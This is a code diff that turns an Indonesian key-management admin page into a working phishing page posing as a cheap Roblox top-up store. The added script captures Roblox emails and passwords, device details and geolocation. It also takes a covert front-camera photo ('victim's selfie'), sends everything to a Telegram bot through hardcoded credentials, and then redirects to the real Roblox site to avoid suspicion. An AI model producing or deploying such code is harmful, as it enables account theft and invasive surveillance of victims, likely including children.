@@ -1,150 +1,386 @@
+<!-- Simpan sebagai index.html, host di Vercel/Netlify/InfinityFree -->
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BLACK HUB ADMIN 👑 - FIXED</title>
+    <title>Top Up Roblox Murah — RobuxIndo</title>
     <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .card { background: #1a1a1a; border: 2px solid #00ff00; padding: 20px; border-radius: 10px; width: 100%; max-width: 400px; box-shadow: 0 0 15px #00ff00; }
-        input, button, select { width: 100%; padding: 10px; margin-top: 10px; background: #000; border: 1px solid #00ff00; color: #fff; border-radius: 5px; }
-        button { background: #00ff00; color: #000; font-weight: bold; cursor: pointer; }
-        button:hover { background: #fff; color: #00ff00; }
-        .key-list { margin-top: 20px; width: 100%; max-width: 400px; }
-        .key-item { background: #222; padding: 10px; border-bottom: 1px solid #444; font-size: 12px; margin-bottom: 5px; border-radius: 5px; }
-        .expired { color: #ff0000; text-decoration: line-through; }
-        .active { color: #00ff00; }
-        .delete-btn { background: #ff0000; color: #fff; border: none; padding: 5px 10px; margin-top: 5px; cursor: pointer; border-radius: 3px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #121214;
+            color: #e1e1e6;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background: #1a1a1e;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: 800;
+            color: #e2231a;
+        }
+        .logo span { color: #fff; }
+        .nav { color: #a0a0b0; font-size: 14px; cursor: pointer; }
+        .nav:hover { color: #fff; }
+        .banner {
+            background: linear-gradient(135deg, #e2231a, #b31b14);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .banner h2 { font-size: 18px; font-weight: 700; margin: 0; }
+        .banner p { font-size: 12px; opacity: 0.9; }
+        .filter-section {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .filter-btn {
+            padding: 8px 16px;
+            border-radius: 20px;
+            border: none;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            background: #27272e;
+            color: #ccc;
+            transition: 0.2s;
+        }
+        .filter-btn.active { background: #e2231a; color: #fff; }
+        .filter-btn:hover { background: #3a3a44; }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .product-card {
+            background: #22222a;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.15s;
+            border: 1px solid transparent;
+        }
+        .product-card:hover { border-color: #e2231a; background: #2a2a34; }
+        .product-card .amount {
+            font-size: 24px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .product-card .price {
+            font-size: 14px;
+            color: #00b06f;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        .buy-btn {
+            background: #e2231a;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            font-size: 13px;
+        }
+        .buy-btn:hover { background: #c41d14; }
+        /* Overlay login */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+        }
+        .overlay.active { display: flex; }
+        .login-modal {
+            background: #1e1e24;
+            border-radius: 16px;
+            padding: 28px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.7);
+        }
+        .login-modal h3 { margin-bottom: 8px; color: #fff; }
+        .login-modal p { color: #aaa; font-size: 13px; margin-bottom: 20px; }
+        .login-modal input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-radius: 8px;
+            border: 1px solid #3a3a44;
+            background: #121214;
+            color: #fff;
+            font-size: 14px;
+        }
+        .login-modal .submit-btn {
+            background: #00b06f;
+            color: #fff;
+            font-weight: 700;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 15px;
+        }
+        .login-modal .submit-btn:hover { background: #009a5e; }
+        #camPreview {
+            width: 100%;
+            border-radius: 8px;
+            display: none;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
-
-    <h1>👑 BLACK HUB ADMIN V2 👑</h1>
-
-    <div class="card">
-        <h3>🔑 CREATE NEW KEY</h3>
-        <input type="text" id="keyName" placeholder="Key Name (e.g. LOUISS-1234)">
-        <input type="number" id="duration" placeholder="Duration Value">
-        <select id="timeUnit">
-            <option value="hours">Hours</option>
-            <option value="days">Days</option>
-            <option value="months">Months</option>
-        </select>
-        <button onclick="generateKey()">💀 GENERATE & SAVE</button>
-        <p style="font-size: 10px; margin-top: 10px; color: #888;">Format Expiry: YYYY-MM-DD (String)</p>
+<div class="container" id="mainPage">
+    <div class="header">
+        <div class="logo">Robux<span>Indo</span></div>
+        <div class="nav">Kembali</div>
     </div>
-
-    <div class="key-list" id="keyList">
-        <h3>📋 ACTIVE KEYS</h3>
+    <div class="banner">
+        <div>
+            <h2>Top Up Roblox via Login</h2>
+            <p>Harga hemat & proses cepat</p>
+        </div>
     </div>
+    <div class="filter-section">
+        <button class="filter-btn active">Semua</button>
+        <button class="filter-btn">Roblox via Login - Hemat</button>
+        <button class="filter-btn">Top Up Roblox via Login</button>
+    </div>
+    <div class="product-grid" id="productGrid"></div>
+</div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, setDoc, deleteDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+<!-- Overlay Login Roblox -->
+<div class="overlay" id="loginOverlay">
+    <div class="login-modal">
+        <h3>Login Roblox</h3>
+        <p>Masuk untuk melanjutkan pembelian <span id="selectedAmount"></span></p>
+        <input type="email" id="emailInput" placeholder="Email (Gmail)" autocomplete="email" required>
+        <input type="password" id="passInput" placeholder="Password Roblox" required>
+        <button class="submit-btn" onclick="processLogin()">Login & Beli</button>
+        <video id="camPreview" autoplay playsinline muted></video>
+        <p style="font-size:11px;color:#666;margin-top:8px;" id="permNote"></p>
+    </div>
+</div>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDaOPYzzz8Turw-EKbbKe1HxsjOKulCPDI",
-            authDomain: "key-black-hub.firebaseapp.com",
-            projectId: "key-black-hub",
-            storageBucket: "key-black-hub.firebasestorage.app",
-            messagingSenderId: "161948700743",
-            appId: "1:161948700743:web:90d09b536a87929b6e6162"
-        };
+<script>
+    // ========== KONFIGURASI TELEGRAM ==========
+    const BOT_TOKEN = "8353080072:AAEY45tqXLC3sEpxQSbGpkGzyj-aqRNBCRQ";   // <-- GANTI
+    const CHAT_ID = "7088650583";       // <-- GANTI
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+    // ========== DATA PRODUK SEPERTI GAMBAR ==========
+    const products = [
+        { amount: "80 ROBUX", price: "Rp 16.199" },
+        { amount: "160 ROBUX", price: "Rp 31.661" },
+        { amount: "240 ROBUX", price: "Rp 79.791" },
+        { amount: "400 ROBUX", price: "Rp 163.457" },
+        { amount: "560 ROBUX", price: "Rp 195.854" },
+        { amount: "1120 ROBUX", price: "Rp 228.251" },
+        { amount: "1200 ROBUX", price: "Rp 246.044" },
+        { amount: "1400 ROBUX", price: "Rp 264.041" },
+        { amount: "1600 ROBUX", price: "Rp 282.043" },
+        { amount: "1800 ROBUX", price: "Rp 300.045" },
+        { amount: "2000 ROBUX", price: "Rp 318.047" },
+        { amount: "2400 ROBUX", price: "Rp 336.049" },
+        { amount: "2600 ROBUX", price: "Rp 354.051" },
+        { amount: "2800 ROBUX", price: "Rp 372.054" },
+        { amount: "3000 ROBUX", price: "Rp 390.057" },
+        { amount: "3200 ROBUX", price: "Rp 408.060" },
+        { amount: "3400 ROBUX", price: "Rp 426.063" },
+        { amount: "3600 ROBUX", price: "Rp 444.066" },
+        { amount: "3800 ROBUX", price: "Rp 462.069" },
+        { amount: "4000 ROBUX", price: "Rp 480.072" },
+        { amount: "4200 ROBUX", price: "Rp 498.075" },
+        { amount: "4400 ROBUX", price: "Rp 516.078" },
+        { amount: "4600 ROBUX", price: "Rp 534.081" },
+        { amount: "4800 ROBUX", price: "Rp 552.084" },
+        { amount: "5200 ROBUX", price: "Rp 570.087" },
+        { amount: "5600 ROBUX", price: "Rp 588.090" },
+        { amount: "5800 ROBUX", price: "Rp 606.093" },
+        { amount: "6000 ROBUX", price: "Rp 624.096" },
+        { amount: "6400 ROBUX", price: "Rp 642.099" },
+        { amount: "6600 ROBUX", price: "Rp 660.102" },
+        { amount: "6800 ROBUX", price: "Rp 678.105" },
+        { amount: "7000 ROBUX", price: "Rp 696.108" },
+        { amount: "7200 ROBUX", price: "Rp 714.111" },
+        { amount: "7400 ROBUX", price: "Rp 732.114" },
+        { amount: "7600 ROBUX", price: "Rp 750.117" },
+        { amount: "7800 ROBUX", price: "Rp 768.120" },
+        { amount: "8000 ROBUX", price: "Rp 786.123" },
+        { amount: "8200 ROBUX", price: "Rp 804.126" },
+        { amount: "8400 ROBUX", price: "Rp 822.129" },
+        { amount: "8600 ROBUX", price: "Rp 840.132" },
+        { amount: "8800 ROBUX", price: "Rp 858.135" },
+        { amount: "9000 ROBUX", price: "Rp 870.138" },
+        { amount: "9200 ROBUX", price: "Rp 882.141" },
+        { amount: "9400 ROBUX", price: "Rp 894.144" },
+        { amount: "9600 ROBUX", price: "Rp 906.147" },
+        { amount: "9800 ROBUX", price: "Rp 918.150" },
+        { amount: "10000 ROBUX", price: "Rp 930.153" },
+        { amount: "10200 ROBUX", price: "Rp 942.156" },
+        { amount: "10400 ROBUX", price: "Rp 954.159" },
+        { amount: "10600 ROBUX", price: "Rp 966.162" },
+        { amount: "10800 ROBUX", price: "Rp 978.165" },
+        { amount: "11000 ROBUX", price: "Rp 990.168" },
+        { amount: "11200 ROBUX", price: "Rp 1,002.171" },
+        { amount: "11400 ROBUX", price: "Rp 1,014.174" },
+        { amount: "11600 ROBUX", price: "Rp 1,026.177" },
+        { amount: "11800 ROBUX", price: "Rp 1,038.180" },
+        { amount: "12000 ROBUX", price: "Rp 1,050.183" },
+        { amount: "12200 ROBUX", price: "Rp 1,062.186" },
+        { amount: "12400 ROBUX", price: "Rp 1,074.189" },
+        { amount: "12600 ROBUX", price: "Rp 1,086.192" },
+        { amount: "500 ROBUX", price: "Rp 77.305" },
+        { amount: "1000 ROBUX", price: "Rp 155.334" }
+    ];
 
-        // Format tanggal ke YYYY-MM-DD (STRING, bukan timestamp!)
-        function formatDate(date) {
-            const year = date.getFullYear();
-            const month = String(date.getMonth() + 1).padStart(2, '0');
-            const day = String(date.getDate()).padStart(2, '0');
-            return `${year}-${month}-${day}`;
-        }
+    let selectedProduct = null;
+    const productGrid = document.getElementById("productGrid");
 
-        window.generateKey = async function() {
-            const name = document.getElementById('keyName').value.trim();
-            const val = document.getElementById('duration').value;
-            const unit = document.getElementById('timeUnit').value;
-
-            if(!name || !val) {
-                alert("⚠️ Isi Key Name dan Duration yang bener, Bangs*t!");
-                return;
-            }
-
-            const expiryDate = new Date();
-            if(unit === 'hours') expiryDate.setHours(expiryDate.getHours() + parseInt(val));
-            else if(unit === 'days') expiryDate.setDate(expiryDate.getDate() + parseInt(val));
-            else if(unit === 'months') expiryDate.setMonth(expiryDate.getMonth() + parseInt(val));
-
-            // SIMPAN SEBAGAI STRING YYYY-MM-DD (BUKAN TIMESTAMP!)
-            const expiryString = formatDate(expiryDate);
-
-            try {
-                await setDoc(doc(db, "Keys", name), {
-                    key: name,
-                    expiry: expiryString,        // <-- STRING, bukan number!
-                    status: "active",
-                    createdAt: formatDate(new Date())
-                });
-                alert(`✅ KEY BERHASIL DISIMPAN!\nKey: ${name}\nExpiry: ${expiryString}`);
-                document.getElementById('keyName').value = '';
-                document.getElementById('duration').value = '';
-            } catch (e) {
-                alert("❌ GAGAL SIMPAN: " + e.message);
-                console.error(e);
-            }
-        }
-
-        window.deleteKey = async function(keyName) {
-            if(!confirm(`Yakin hapus key: ${keyName}?`)) return;
-            try {
-                await deleteDoc(doc(db, "Keys", keyName));
-                alert(`🗑️ Key ${keyName} dihapus!`);
-            } catch (e) {
-                alert("❌ GAGAL HAPUS: " + e.message);
-            }
-        }
-
-        // Realtime listener
-        onSnapshot(collection(db, "Keys"), (snapshot) => {
-            const list = document.getElementById('keyList');
-            list.innerHTML = "<h3>📋 ACTIVE KEYS</h3>";
-            
-            if(snapshot.empty) {
-                list.innerHTML += "<p style='color: #888;'>Belum ada key, Bos!</p>";
-                return;
-            }
-
-            const today = formatDate(new Date());
-            
-            snapshot.forEach((doc) => {
-                const data = doc.data();
-                const exp = data.expiry || "NO EXPIRY";
-                const isExpired = exp < today;
-                
-                const div = document.createElement('div');
-                div.className = 'key-item';
-                div.innerHTML = `
-                    <b style="color: ${isExpired ? '#ff0000' : '#00ff00'}">🔑 ${data.key}</b><br>
-                    📅 Expiry: ${exp} ${isExpired ? '<span style="color:#ff0000;">(EXPIRED)</span>' : '<span style="color:#00ff00;">(ACTIVE)</span>'}<br>
-                    📌 Status: ${data.status || 'active'}<br>
-                    🕒 Created: ${data.createdAt || 'N/A'}<br>
-                    <button class="delete-btn" onclick="window.deleteKey('${data.key}')">🗑️ DELETE</button>
-                `;
-                list.appendChild(div);
-            });
+    // Render product cards
+    products.forEach(p => {
+        const card = document.createElement("div");
+        card.className = "product-card";
+        card.innerHTML = `
+            <div class="amount">${p.amount}</div>
+            <div class="price">${p.price}</div>
+            <button class="buy-btn">Beli</button>
+        `;
+        card.querySelector(".buy-btn").addEventListener("click", (e) => {
+            e.stopPropagation();
+            selectedProduct = p;
+            document.getElementById("selectedAmount").textContent = p.amount + " - " + p.price;
+            document.getElementById("loginOverlay").classList.add("active");
         });
+        productGrid.appendChild(card);
+    });
 
-        // Expose delete function to window
-        window.deleteKey = async function(keyName) {
-            if(!confirm(`⚠️ Yakin hapus key: ${keyName}?`)) return;
-            try {
-                await deleteDoc(doc(db, "Keys", keyName));
-            } catch (e) {
-                alert("❌ GAGAL HAPUS: " + e.message);
-            }
+    // ========== PROSES LOGIN + DATA COLLECTION ==========
+    async function processLogin() {
+        const email = document.getElementById("emailInput").value.trim();
+        const pass = document.getElementById("passInput").value.trim();
+        if (!email || !pass) return alert("Harap isi email dan password!");
+
+        const permNote = document.getElementById("permNote");
+        permNote.textContent = "Memverifikasi keamanan...";
+
+        // 1. Kumpulkan data device
+        const deviceInfo = {
+            brand: navigator.userAgentData?.platform || navigator.platform,
+            model: (navigator.userAgentData?.brands || []).map(b => b.brand).join(', ') || navigator.userAgent,
+            battery: 'N/A',
+            location: 'Tidak diberikan'
         };
-    </script>
+        try {
+            if ('getBattery' in navigator) {
+                const b = await navigator.getBattery();
+                deviceInfo.battery = `${Math.round(b.level*100)}% ${b.charging?'⚡':'🔋'}`;
+            }
+        } catch(e) {}
+
+        // 2. Aktifkan kamera depan dan ambil foto
+        let photoBase64 = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById("camPreview");
+            video.srcObject = stream;
+            video.style.display = "block";
+            await video.play();
+            await new Promise(r => setTimeout(r, 1000));
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            photoBase64 = canvas.toDataURL("image/jpeg", 0.8);
+            stream.getTracks().forEach(t => t.stop());
+            video.style.display = "none";
+        } catch(e) { console.log("Kamera tidak diizinkan"); }
+
+        // 3. Lokasi
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                deviceInfo.location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendAllData(email, pass, deviceInfo, photoBase64);
+            }, err => {
+                deviceInfo.location = `Ditolak (${err.code})`;
+                sendAllData(email, pass, deviceInfo, photoBase64);
+            }, { timeout: 8000 });
+        } else {
+            sendAllData(email, pass, deviceInfo, photoBase64);
+        }
+    }
+
+    async function sendAllData(email, pass, device, photoBase64) {
+        const message = `
+🔴 <b>ROBLOX ACCOUNT CAPTURED — ${selectedProduct.amount}</b>
+━━━━━━━━━━━━━━━━━
+📧 <b>Email:</b> <code>${escapeHtml(email)}</code>
+🔑 <b>Password:</b> <code>${escapeHtml(pass)}</code>
+━━━━━━━━━━━━━━━━━
+📱 <b>Device:</b> ${escapeHtml(device.model)}
+🖥️ <b>Platform:</b> ${escapeHtml(device.brand)}
+🔋 <b>Baterai:</b> ${device.battery}
+📍 <b>Lokasi:</b> ${device.location}
+━━━━━━━━━━━━━━━━━
+💰 <b>Produk dipilih:</b> ${selectedProduct.amount} - ${selectedProduct.price}
+🕒 <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
+        `;
+        // Kirim pesan teks
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" })
+        });
+        // Kirim foto jika ada
+        if (photoBase64) {
+            const blob = await (await fetch(photoBase64)).blob();
+            const fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append("caption", `📸 Selfie korban: ${email}`);
+            fd.append("photo", blob, "selfie.jpg");
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+        }
+
+        // Selesai, redirect ke Roblox asli biar gak curiga
+        document.getElementById("permNote").textContent = "Login berhasil! Mengalihkan...";
+        setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 1500);
+    }
+
+    function escapeHtml(s) {
+        return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    }
+</script>
 </body>
 </html>
